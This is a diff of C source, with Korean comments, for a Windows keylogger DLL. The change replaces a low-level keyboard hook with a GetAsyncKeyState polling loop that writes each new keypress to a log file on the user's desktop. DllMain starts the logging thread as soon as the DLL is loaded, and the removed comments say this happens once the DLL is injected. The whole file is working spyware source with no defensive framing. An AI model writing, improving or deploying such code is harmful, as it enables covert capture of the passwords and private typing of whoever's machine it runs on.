@@ -1,104 +1,58 @@
 #include <windows.h>
 #include <stdio.h>
 
-#define LOG_FILE "C:\\keylog_dll.txt"
+#define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"
 
-HHOOK hKeyboardHook;
-HINSTANCE hInstance;
+// 키 상태 추적 배열 (중복 방지)
+static BOOL keyPressed[256] = {FALSE};
 
-// 키 이름 매핑
-const char* GetKeyName(int vkCode) {
-    switch(vkCode) {
-        case VK_BACK: return "[BACKSPACE]";
-        case VK_RETURN: return "[ENTER]\n";
-        case VK_SPACE: return " ";
-        case VK_TAB: return "[TAB]";
-        case VK_SHIFT: return "[SHIFT]";
-        case VK_CONTROL: return "[CTRL]";
-        case VK_ESCAPE: return "[ESC]";
-        default: return NULL;
+void LogKey(int key) {
+    FILE* logFile = fopen(LOG_FILE, "a");
+    if (logFile == NULL) return;
+
+    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
+        fprintf(logFile, "%c", key);
     }
+    else if (key == VK_SPACE) fprintf(logFile, " ");
+    else if (key == VK_RETURN) fprintf(logFile, "[ENTER]\n");
+    else if (key == VK_BACK) fprintf(logFile, "[BACK]");
+    else if (key == VK_TAB) fprintf(logFile, "[TAB]");
+    else if (key == VK_SHIFT) fprintf(logFile, "[SHIFT]");
+    else if (key == VK_CONTROL) fprintf(logFile, "[CTRL]");
+    else if (key == VK_MENU) fprintf(logFile, "[ALT]");
+
+    fclose(logFile);
 }
 
-// 키보드 후킹 콜백
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
-        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
-        int vkCode = kbStruct->vkCode;
-        
-        FILE *logFile = fopen(LOG_FILE, "a");
-        if (logFile != NULL) {
-            const char* keyName = GetKeyName(vkCode);
-            if (keyName != NULL) {
-                fprintf(logFile, "%s", keyName);
-            }
-            else if (vkCode >= 0x30 && vkCode <= 0x5A) {
-                BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
-                BOOL capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
-                
-                char key = vkCode;
-                if (vkCode >= 0x41 && vkCode <= 0x5A) {
-                    if (!(shift ^ capsLock)) {
-                        key = key + 32;
-                    }
-                }
-                fprintf(logFile, "%c", key);
-            }
-            fflush(logFile);
-            fclose(logFile);
-        }
-    }
-    
-    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
-}
-
-// DLL 시작 함수
 DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
-    // 로그 파일 초기화
-    FILE *logFile = fopen(LOG_FILE, "a");
+    FILE* logFile = fopen(LOG_FILE, "a");
     if (logFile) {
-        fprintf(logFile, "\n=== Keylogger DLL Injected ===\n");
+        fprintf(logFile, "\n=== Keylogger Started ===\n");
         fclose(logFile);
     }
-    
-    // 키보드 후킹 설치
-    hKeyboardHook = SetWindowsHookEx(
-        WH_KEYBOARD_LL,
-        KeyboardProc,
-        NULL,
-        0
-    );
-    
-    if (hKeyboardHook == NULL) {
-        return 1;
+
+    while (1) {
+        for (int i = 8; i < 256; i++) {
+            SHORT keyState = GetAsyncKeyState(i);
+            
+            // 키가 새로 눌렸을 때만 기록 (중복 방지!)
+            if ((keyState & 0x8000) && !keyPressed[i]) {
+                LogKey(i);
+                keyPressed[i] = TRUE;
+            }
+            // 키가 떼어졌을 때 상태 초기화
+            else if (!(keyState & 0x8000) && keyPressed[i]) {
+                keyPressed[i] = FALSE;
+            }
+        }
+        Sleep(10);  // CPU 부하 감소
     }
-    
-    // 메시지 루프
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    
-    UnhookWindowsHookEx(hKeyboardHook);
     return 0;
 }
 
-// DLL 메인
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
-    hInstance = hModule;
-    
-    switch(dwReason) {
-        case DLL_PROCESS_ATTACH:
-            // DLL이 주입되면 키로거 스레드 시작
-            CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
-            break;
-        case DLL_PROCESS_DETACH:
-            if (hKeyboardHook != NULL) {
-                UnhookWindowsHookEx(hKeyboardHook);
-            }
-            break;
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
     }
-    
     return TRUE;
 }
